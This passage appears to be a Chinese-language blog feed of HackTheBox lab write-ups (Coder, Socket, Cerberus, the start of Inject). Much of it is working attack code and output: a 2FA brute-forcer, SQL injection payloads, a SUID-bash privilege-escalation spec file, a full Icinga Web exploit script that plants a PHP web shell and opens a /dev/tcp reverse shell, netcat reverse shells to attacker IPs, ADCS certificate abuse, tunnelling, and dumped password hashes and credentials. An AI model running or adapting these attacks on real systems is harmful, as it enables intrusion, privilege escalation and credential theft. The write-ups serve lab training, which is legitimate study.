l.\"\"\" for i in range(0, n): yield l[i::n]def try_cookies(wordlist: list, pbar: tqdm.tqdm): s = requests.Session() s.cookies[\"TCSESSIONID\"] = args.session_id s.headers['X-Requested-With'] = 'XMLHttpRequest' s.headers['X-TeamCity-Client'] = 'Web UI' s.headers['X-TC-CSRF-Token'] = args.csrf_token for guess in wordlist: response = s.post(\"https://teamcity-dev.coder.htb/2fa.html\", data=&#123;\"password\": guess&#125;, verify=False, allow_redirects=False) if response.status_code == 302: logger.info(s.cookies.items()) logger.success(f\"Logged in with code &#123;guess&#125;\") # elif not response.ok: # logger.debug(response.status_code) pbar.update()if __name__ == '__main__': parser = argparse.ArgumentParser() parser.add_argument('--session-id', '-s', default='843D031AFDB95E5CAC860C82FF503DDE') parser.add_argument('--csrf-token', '-c', default='50fbe4ac-459d-4eca-9b35-efeefd9a794c') parser.add_argument('--threads', '-n', default=100) args = parser.parse_args() wordlist = tuple(f'&#123;x:06&#125;' for x in range(1000000)) with tqdm.tqdm(total=len(wordlist), mininterval=2) as pbar: with ThreadPoolExecutor(max_workers=args.threads) as executor: futures = [executor.submit(try_cookies, w, pbar) for w in chunks(wordlist, args.threads)] results = [] for future in futures: results.append(future.result()) 预期方法参考： HTB: Coder | 0xdf hacks stuffhttps://0xdf.gitlab.io/2023/12/16/htb-coder.html 简单来说，就是前面keepass中得到的数据是加密备份的，直接添加进去生成的OTP是无法使用的，因为不知道密钥 然后根据加密方式写脚本爆破出加密用的密钥，然后解密得到真正的secret 之后就是正常的OTP登录，后面部分相同 teamcity getshell Running Personal Build | TeamCity On-Premises Documentationhttps://www.jetbrains.com/help/teamcity/personal-build.html#Direct+Patch+Upload 根据文档，可以通过patch的方式运行，patch需要是一个格式正确的diff文件, 直接根据smb里的repo修改后diff即可： 提交运行，得到svc_teamcity： e.black 信息打到的shell当前目录有个key(不确定是本身就该有的还是别人放的，根据文件时间应该是原本就有的，不过无所谓，自己也能根据diff还原出来)，查看之前的diff发现密码相关信息： 1type C:\\ProgramData\\JetBrains\\Teamcity\\system\\changes\\101.changes.diff 根据diff还原出enc，参考原本的命令解出e.black明文密码： 1234567$key = Get-Content \".\\key.key\"curl http://10.10.14.8:7778/enc.txt -o .\\enc.txt$pass = (Get-Content \".\\enc.txt\" | ConvertTo-SecureString -Key $key)$UnsecurePassword = (New-Object PSCredential 0, $pass).GetNetworkCredential().Passwordecho $UnsecurePasswordypOSJXPqlDOxxbQSfEERy300 enc.txt176492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQANAA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA&#x3D;&#x3D; user flag得到的账号密码登录，桌面得到user flag： 123evil-winrm -u 'e.black' -i 10.10.11.207ypOSJXPqlDOxxbQSfEERy300 提权信息当前用户在PKI Admins组中，前面也看到有ADCS相关，那就重点看这部分,使用支持pki的rusthound： OPENCYBER-FR/RustHound: Active Directory data collector for BloodHound written in Rust. 🦀https://github.com/OPENCYBER-FR/RustHound 或者简单的直接Cetrify内存执行查询pki相关,(先在evil-winrm里再执行一次reverse，不然没输出)： 1234567 curl http://10.10.14.8:7777/nc.exe -o .\\nc.exe .\\nc.exe 10.10.14.8 4444 -e powershell.exe$bytes = (Invoke-WebRequest \"http://10.10.14.8:7777/Certify.exe\" -UseBasicParsing ).Content$assembly = [System.Reflection.Assembly]::Load($bytes)$entryPointMethod = $assembly.GetTypes().Where(&#123; $_.Name -eq 'Program' &#125;, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')$entryPointMethod.Invoke($null, (, [string[]] ('pkiobjects'))) 输出显示PKI Admins对coder-DC01-CA有写权限 ADCS有写权限就可以直接写入一个存在漏洞的模板，然后利用ADCS： GoateePFE/ADCSTemplate: A PowerShell module for exporting, importing, removing, permissioning, publishing Active Directory Certificate Templates. It also includes a DSC resource for creating AD CS templates using these functions. This was built with the intent of using DSC for rapid lab builds. Could also work in production to move templates between AD CS environments.https://github.com/GoateePFE/ADCSTemplate 1234567891011121314151617curl http://10.10.14.8:7778/ADCSTemplate.psm1 -o .\\ADCSTemplate.psm1Import-Module .\\ADCSTemplate.psm1Export-ADCSTemplate -DisplayName User &gt; miao.json# 下载到本地，修改内容Changed msPKI-Certificate-Name-Flag to 1 for enrollee supplies subjectChanged msPKI-Enrollment-Flag to 0 for none # 重新上传，导入，创建模板curl http://10.10.14.8:7778/miao.json -o .\\miao.jsonNew-ADCSTemplate -DisplayName test1 -JSON (Get-Content .\\miao.json -Raw) -Publish# 给e.black enroll 权限Set-ADCSTemplateACL -DisplayName test1 -Type Allow -Identity 'CODER.HTB\\e.black' -Enroll# 然后就是ESC1certipy find -vulnerable -stdout -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -dc-ip 10.10.11.207 提权 &amp; root flag这里也有坑，4.0.0的certipy auth时一直报错，4.4.0就正常得到hash: Release Certipy 4.4.0 · ly4k/Certipyhttps://github.com/ly4k/Certipy/releases/tag/4.4.0 123456789101112# 4.4.0 certipypython3 setup.py install# esc1 获取证书certipy-ad req -u e.black@coder.htb -p ypOSJXPqlDOxxbQSfEERy300 -target dc01.coder.htb -template test2 -ca coder-DC01-CA -upn administrator@coder.htb -dns dc01.coder.htb# auth时可能会报错时钟偏移问题，先ntp同步时间sudo ntpdate -s 10.10.11.202certipy-ad auth -pfx administrator_dc01.pfx -dc-ip 10.10.11.207[*] Got hash for 'administrator@coder.htb': aad3b435b51404eeaad3b435b51404ee:807726fcf9f188adc26eeafd7dc16bb root flag使用得到的hash登录： 1evil-winrm -u Administrator -H 807726fcf9f188adc26eeafd7dc16bb7 -i 10.10.11.207 参考资料 Running Personal Build | TeamCity On-Premises Documentationhttps://www.jetbrains.com/help/teamcity/personal-build.html#Direct+Patch+Upload OPENCYBER-FR/RustHound: Active Directory data collector for BloodHound written in Rust. 🦀https://github.com/OPENCYBER-FR/RustHound GoateePFE/ADCSTemplate: A PowerShell module for exporting, importing, removing, permissioning, publishing Active Directory Certificate Templates. It also includes a DSC resource for creating AD CS templates using these functions. This was built with the intent of using DSC for rapid lab builds. Could also work in production to move templates between AD CS environments.https://github.com/GoateePFE/ADCSTemplate GhostPack/Certify: Active Directory certificate abuse.https://github.com/GhostPack/Certify ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abusehttps://github.com/ly4k/Certipy HTB: Coder | 0xdf hacks stuffhttps://0xdf.gitlab.io/2023/12/16/htb-coder.html#","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Socket - HackTheBox","slug":"Socket-HackTheBox","date":"2023-03-27T07:50:55.000Z","updated":"2023-07-17T00:29:49.210Z","comments":true,"path":"2023/03/27/Socket-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/03/27/Socket-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Socket 10.10.11.206 端口扫描22和80： 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.206Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 14:06 CSTNmap scan report for 10.10.11.206Host is up (0.10s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)|_ 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)80/tcp open http Apache httpd 2.4.52|_http-title: Did not follow redirect to http://qreader.htb/|_http-server-header: Apache/2.4.52 (Ubuntu)Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 49.47 seconds 80需要加hosts.在线的QReader： 110.10.11.206 qreader.htb QReader在线功能就是输入文字生成二维码，以及扫描提取二维码内容，但还提供有app下载： app下载下来分析，这里小坑，根据网站是flask猜测这里是直接python打包的app,提取出来pyc： 12345pip3 install -U pyinstallerpyi-archive_viewer qreader.exe? X qreaderto filename? ./qreader.pyc 然后反编译pyc得到python源码(python版本也会坑，3.8可以)： 12pip3 install uncompyle6uncompyle6 qreader.pyc &gt; qreader.py ##qreader.py 代码里发现websocket，对应域名同样加hosts： 123456789101112131415...ws_host = 'ws://ws.qreader.htb:5789'... def version(self): response = asyncio.run(ws_connect(ws_host + '/version', json.dumps(&#123; 'version': VERSION &#125;))) data = json.loads(response) if 'error' not in data.keys(): version_info = data['message'] msg = f'''[INFO] You have version &#123;version_info['version']&#125; which was released on &#123;version_info['released_date']&#125;''' self.statusBar().showMessage(msg) return None error = None['error'] self.statusBar().showMessage(error)... websocket根据代码测试构造请求，得到响应： 简单的测试发现存在注入(闭合需要用双引号)： sql injectionwscat一次只能一条请求，可以把流量转发到burp方便后续操作： 1wscat -c ws://ws.qreader.htb:5789/version --proxy http://127.0.0.1:8080 后续就是一步步注入获取信息，因为有回显所以简单几步手动就可以，(注意数据库是sqlite)： 12345678910&#123;\"version\":\"0.0.3\\\" UNION SELECT 1,2,3,4-- -\"&#125;&#123;\"version\":\"0.0.3\\\" UNION SELECT sqlite_version(),2,3,4-- -\"&#125;&#123;\"version\":\"0.0.3\\\" UNION SELECT group_concat(name),2,3,4 from sqlite_schema-- -\"&#125;&#123;\"version\":\"0.0.3\\\" UNION SELECT sql,2,3,4 from sqlite_master WHERE type!=\\\"meta\\\" AND sql NOT NULL AND name =\\\"users\\\"-- -\"&#125;&#123;\"message\": &#123;\"id\": \"admin\", \"version\": \"0c090c365fa0559b151a43e0fea39710\", \"released_date\": 3, \"downloads\": 4&#125;&#125;# 获取管理员的用户名&#123;\"version\":\"0.0.3\\\" UNION SELECT group_concat(answered_by),group_concat(answer),3,4 from answers-- -\"&#125;Thomas Keller user flag这里也有小坑，密码就是前面得到的hash破解出明文，用户名需要根据全名以及命名规则简单的猜一下： 1234Thomas Keller -&gt; tkeller0c090c365fa0559b151a43e0fea39710 -&gt; denjanjade122566ssh tkeller@10.10.11.206 提权信息sudo -l发现一个sh，查看内容发现build调用pyinstaller Using PyInstaller — PyInstaller 5.9.0 documentationhttps://pyinstaller.org/en/stable/usage.html 实际上可以直接执行任意python代码，并不需要满足spec格式 build-installer.sh1234567891011121314151617181920212223242526272829303132333435363738394041#!/bin/bashif [ $# -ne 2 ] &amp;&amp; [[ $1 != 'cleanup' ]]; then /usr/bin/echo \"No enough arguments supplied\" exit 1;fiaction=$1name=$2ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '&#123; print $(NF) &#125;')if [[ -L $name ]];then /usr/bin/echo 'Symlinks are not allowed' exit 1;fiif [[ $action == 'build' ]]; then if [[ $ext == 'spec' ]] ; then /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2&gt;/dev/null /home/svc/.local/bin/pyinstaller $name /usr/bin/mv ./dist ./build /opt/shared else echo \"Invalid file format\" exit 1; fielif [[ $action == 'make' ]]; then if [[ $ext == 'py' ]] ; then /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2&gt;/dev/null /root/.local/bin/pyinstaller -F --name \"qreader\" $name --specpath /tmp /usr/bin/mv ./dist ./build /opt/shared else echo \"Invalid file format\" exit 1; fielif [[ $action == 'cleanup' ]]; then /usr/bin/rm -r ./build ./dist 2&gt;/dev/null /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2&gt;/dev/null /usr/bin/rm /tmp/qreader* 2&gt;/dev/nullelse /usr/bin/echo 'Invalid action' exit 1;fi 提权 &amp; root flag准备一个spec文件，里面是我们想要执行的python代码，然后运行脚本build： miao.spec12import osos.system(\"chmod +s /bin/bash\") shadow123root:$y$j9T$OLN5GxGBDoi4BrbdKdL&#x2F;D0$W8iLzJQcU2QHkw97ZsyBRgSOI8Y&#x2F;ZqxYRrqktrV7PMD:19326:0:99999:7:::svc:$y$j9T$5Yt6cQk&#x2F;UYMTQ&#x2F;WvjwgJW&#x2F;$P7mPNqZI3yy9gSPD8&#x2F;WRtwNTfEBdQS7HlEd66zgDpw2:19326:0:99999:7:::tkeller:$y$j9T$tZ5IIJbeXPN93a5DzGnhw1$2DoCFmSy2Sd8uqcrtrUxwxnKnJjVgHruggUBtsfvv75:19320:0:99999:7::: 参考资料 Using PyInstaller — PyInstaller 5.9.0 documentationhttps://pyinstaller.org/en/stable/usage.html Socket | Noteshttps://blog.zerospl0it.com/posts/Socket/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Cerberus - HackTheBox","slug":"Cerberus-HackTheBox","date":"2023-03-22T05:09:28.000Z","updated":"2023-07-31T02:03:10.944Z","comments":true,"path":"2023/03/22/Cerberus-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/03/22/Cerberus-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/534 10.10.11.205 端口扫描就一个8080: 12345678910111213$ nmap -sC -sV -Pn 10.10.11.205Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-22 09:49 CSTNmap scan report for 10.10.11.205Host is up (0.091s latency).Not shown: 999 filtered tcp ports (no-response)PORT STATE SERVICE VERSION8080/tcp open http Apache httpd 2.4.52 ((Ubuntu))|_http-open-proxy: Proxy might be redirecting requests|_http-server-header: Apache/2.4.52 (Ubuntu)|_http-title: Did not follow redirect to http://icinga.cerberus.local:8080/icingaweb2Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 63.52 seconds 8080需要加hosts,icingaweb2： 110.10.11.205 icinga.cerberus.local icingaweb2可以搜到相关漏洞： Path Traversal Vulnerabilities in Icinga Web | Sonarhttps://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/ LFI首先是LFI读文件： 根据文档读一些配置文件，得到账号密码： 12matthewIcingaWebPassword2023 Advanced Topics - Icinga Webhttps://icinga.com/docs/icinga-web/latest/doc/20-Advanced-Topics/#advanced-topics-authentication-tips-manual-user-database-auth web得到的账号密码可以登录web： CVE-2022-24715然后就是登录后利用CVE-2022-24715，就是根据sonar博客里的步骤： 创建一个ssh密钥对： 1ssh-keygen -t rsa -m PEM 在 icingaweb 中创建一个新的 SSH 资源 配置 -&gt; 资源 -&gt; 创建新资源 123Resource Name: ssh-userUser: ssh-userPrivate Key: &lt;Your generated Key&gt; 创建一个新资源执行php代码 123Resource Name: SHELLUser: ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;dev&#x2F;shm&#x2F;run.phpPrivate Key: file:&#x2F;&#x2F;&#x2F;etc&#x2F;icingaweb2&#x2F;ssh&#x2F;ssh-user%00 &lt;?php system(&quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.2&#x2F;4444 0&gt;&amp;1&#39;&quot;); 转到Configuration -&gt; Application并更改 Module Path 以包含 /dev/ 1WHATEVER:&#x2F;dev&#x2F; 转到Configuration -&gt; Modules并启用shm， 触发执行得到shell Discord里也给出了一个自动化脚本: 1python3 icingaweb2.py -i 10.10.14.2 -p 4444 得到的是容器的www-data: exp.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798import requestsimport bs4import argparseimport randomimport stringdef get_csrf(resp): soup = bs4.BeautifulSoup(resp.text, \"lxml\") csrf_token = soup.find(\"input\", &#123;\"id\": \"CSRFToken\"&#125;)[\"value\"] return csrf_tokenif __name__ == \"__main__\": parser = argparse.ArgumentParser(description='lol') parser.add_argument('-i', '--ip', help='nc listener ip', required=True) parser.add_argument('-p', '--port', help='nc listener port', required=True) args = parser.parse_args() session = requests.session() # LOGIN URL = \"http://icinga.cerberus.local:8080/icingaweb2/authentication/login\" resp = session.get(URL) csrf_token = get_csrf(resp) data = &#123;\"username\":\"matthew\",\"password\":\"IcingaWebPassword2023\",\"rememberme\":\"0\",\"redirect\":\"\",\"formUID\":\"form_login\",\"CSRFToken\":csrf_token,\"btn_submit\":\"Login\"&#125; resp = session.post(URL, data=data) # CHANGE MODULE PATH URL = \"http://icinga.cerberus.local:8080/icingaweb2/config/general\" resp = session.get(URL) csrf_token = get_csrf(resp) data = &#123;\"global_show_stacktraces\":\"0\",\"global_show_stacktraces\":\"1\",\"global_show_application_state_messages\":\"0\",\"global_show_application_state_messages\":\"1\",\"global_module_path\":\"/dev/\",\"global_config_resource\":\"icingaweb2\",\"logging_log\":\"syslog\",\"logging_level\":\"ERROR\",\"logging_application\":\"icingaweb2\",\"logging_facility\":\"user\",\"themes_default\":\"Icinga\",\"themes_disabled\":\"0\",\"authentication_default_domain\":\"\",\"formUID\":\"form_config_general\",\"CSRFToken\":csrf_token,\"btn_submit\":\"Save Changes\"&#125; resp = session.post(URL, data=data) # ENABLE MODULE URL = \"http://icinga.cerberus.local:8080/icingaweb2/config/moduleenable\" resp = session.get(URL) csrf_token = get_csrf(resp) data = &#123;\"identifier\":\"shm\",\"CSRFToken\":csrf_token,\"btn_submit\":\"btn_submit\"&#125; resp = session.post(URL, data=data) # UPLOAD SSH KEY URL = \"http://icinga.cerberus.local:8080/icingaweb2/config/createresource\" resp = session.get(URL) csrf_token = get_csrf(resp) data = &#123;\"type\":\"ssh\",\"name\":\"test\",\"user\":\"test\",\"private_key\":\"-----BEGIN RSA PRIVATE KEY-----\\r\\n\\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\\r\\n\\-----END RSA PRIVATE KEY-----\",\"formUID\":\"form_config_resource\",\"CSRFToken\":csrf_token,\"btn_submit\":\"Save Changes\"&#125; resp = session.post(URL, data=data) # EXPLOIT: WRITE PHP FILE URL = \"http://icinga.cerberus.local:8080/icingaweb2/config/createresource\" resp = session.get(URL) csrf_token = get_csrf(resp) data = &#123;\"type\":\"ssh\",\"name\":\"asdf2\",\"user\":\"../../../../../dev/shm/run.php\",\"private_key\":\"file:///etc/icingaweb2/ssh/test\\x00&lt;?php system($_REQUEST['cmd']);?&gt;\",\"formUID\":\"form_config_resource\",\"CSRFToken\":csrf_token,\"btn_submit\":\"Save Changes\"&#125; resp = session.post(URL, data=data) # GET REVERSE SHELL URL = \"http://icinga.cerberus.local:8080/icingaweb2/shm/run\" data = &#123;\"cmd\":\"bash -c 'bash -i &gt;&amp; /dev/tcp/&#123;&#125;/&#123;&#125; 0&gt;&amp;1'\".format(args.ip,args.port)&#125; session.post(URL, data=data) 容器简单枚举发现firejail有suid： 123find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null&#x2F;usr&#x2F;bin&#x2F;firejail 搜索发现相关漏洞： oss-security - firejail: local root exploit reachable via –join logic (CVE-2022-31214)https://www.openwall.com/lists/oss-security/2022/06/08/10 容器提权 给有poc： https://seclists.org/oss-sec/2022/q2/att-188/firejoin_py.bin 需要两个shell，一个运行firejoin.py，另一个join： 1234567wget 10.10.14.2:7777/firejoin.pypython3 firejoin.pyfirejail --join=1792# 给出的sudo不行，但可以直接su了su - 信息检查相关配置文件以及查看相关数据文件： 123456root@icinga:&#x2F;var&#x2F;lib&#x2F;sss&#x2F;db# strings cache_cerberus.local.ldbname&#x3D;matthew@cerberus.local,cn&#x3D;users,cn&#x3D;cerberus.local,cn&#x3D;sysdbcachedPassword$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX&#x2F;Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0 得到的hash破解出来密码： 123sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt147258369 user flag根据容器ip可以猜测172.16.22.1是宿主机，内部进行扫描，转发端口： 12345./chisel_1.7.0-rc7_darwin_amd64 server -p 9999 --reversewget http://10.10.14.2:7777/chisel_1.7.6_linux_amd64chmod +x chisel_1.7.6_linux_amd64./chisel_1.7.6_linux_amd64 client 10.10.14.2:9999 R:5985:172.16.22.1:5985 然后连接，桌面得到user flag： 1evil-winrm -u 'matthew' -p '147258369' -i 127.0.0.1 提权信息常规枚举发现ManageEngine ADSelfService Plus CVE-2022-47966搜索得到相关的比较新的漏洞： ManageEngine Security Advisorieshttps://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html ZOHO ManageEngine CVE-2022-47966谁的锅https://mp.weixin.qq.com/s/_Q5Y-fuFQvSLJAKRBRTrlA proxy要利用这个漏洞，需要知道一些必要信息，所以还是要先打通代理： 123*Evil-WinRM* PS C:\\windows\\tasks&gt; upload /Users/miao/Tools/Offsec/chisel.exe C:\\windows\\tasks.\\chisel.exe client 10.10.14.2:9999 R:1080:socks 然后可以通过代理扫描宿主机： 12345678910proxychains4 -q nmap -v -Pn -sV -sC -p- 172.16.22.1Scanning 172.16.22.1 [65535 ports]Discovered open port 53&#x2F;tcp on 172.16.22.1Discovered open port 139&#x2F;tcp on 172.16.22.1Discovered open port 135&#x2F;tcp on 172.16.22.1Discovered open port 445&#x2F;tcp on 172.16.22.1Discovered open port 8888&#x2F;tcp on 172.16.22.1Discovered open port 443&#x2F;tcp on 172.16.22.1Discovered open port 80&#x2F;tcp on 172.16.22.1 访问8888会自动重定向到9251，并且需要加hosts： 1172.16.22.1 dc.cerberus.local dc 用我们的matthew账号登录无权限，但已经能够得到所需的GUID了： 167a8d101690402dc6a6744b8fc8a7ca1acf88b2f 检查burp流量也能发现一个对一个xml的请求，其中可以得到需要的issuer信息： 123https:&#x2F;&#x2F;dc.cerberus.local&#x2F;FederationMetadata&#x2F;2007-06&#x2F;FederationMetadata.xmlhttps:&#x2F;&#x2F;dc.cerberus.local&#x2F;adfs&#x2F;services&#x2F;trust exploit &amp; root flag metasploit有对应模块，直接用方便点： 12345678910111213proxychains4 -q msfconsoleuse exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2fset ISSUER_URL http://dc.cerberus.local/adfs/services/trustset RHOSTS 172.16.22.1set LHOST 10.10.14.2# 坑，还是要手动指定一下set Proxies socks5:127.0.0.1:1080set ReverseAllowProxy trueexploit root flag hashdump需要64位shell，默认选项是32位的: 12345678meterpreter &gt; hashdumpAdministrator:500:aad3b435b51404eeaad3b435b51404ee:8a89ac8a8b099a7578cd9698578d01fd:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d2e82d4f77310a49973793ee986b6490:::matthew:1104:aad3b435b51404eeaad3b435b51404ee:bcd285980e1d9b302e16875844ef6977:::DC$:1000:aad3b435b51404eeaad3b435b51404ee:de7392b6e8a9ce8d34209a3838249903:::adfs_svc$:5602:aad3b435b51404eeaad3b435b51404ee:d711db215c7eb570d41acc0cac98da96:::ICINGA$:9102:aad3b435b51404eeaad3b435b51404ee:af70cf6b33f1cce788138d459f676faf::: 参考资料 Path Traversal Vulnerabilities in Icinga Web | Sonarhttps://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/ Advanced Topics - Icinga Webhttps://icinga.com/docs/icinga-web/latest/doc/20-Advanced-Topics/#advanced-topics-authentication-tips-manual-user-database-auth oss-security - firejail: local root exploit reachable via –join logic (CVE-2022-31214)https://www.openwall.com/lists/oss-security/2022/06/08/10 ManageEngine Security Advisorieshttps://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html ZOHO ManageEngine CVE-2022-47966谁的锅https://mp.weixin.qq.com/s/_Q5Y-fuFQvSLJAKRBRTrlA Cerberus | Noteshttps://blog.zerospl0it.com/posts/Cerberus/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Inject - HackTheBox","slug":"Inject-HackTheBox","date":"2023-03-13T04:24:44.000Z","updated":"2023-07-10T00:56:34.673Z","comments":true,"path":"2023/03/13/Inject-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/03/13/Inject-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/533 